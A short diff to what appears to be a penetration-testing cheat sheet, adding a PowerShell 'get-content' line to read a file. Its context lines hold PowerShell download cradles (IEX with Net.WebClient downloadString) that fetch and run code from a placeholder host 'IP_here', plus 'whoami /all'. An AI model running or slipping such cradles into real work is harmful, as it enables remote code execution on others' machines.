@@ -556,6 +556,9 @@ whoami /all
 IEX/New-Object Net.WebClient().downloadString('http://IP_here/path/to/file')
 IEX(New-Object Net.WebClient).downloadString('http://IP_here/path/to/file')
 
+# read text file
+get-content file_name-here
+
 
 PYTHON
 ------
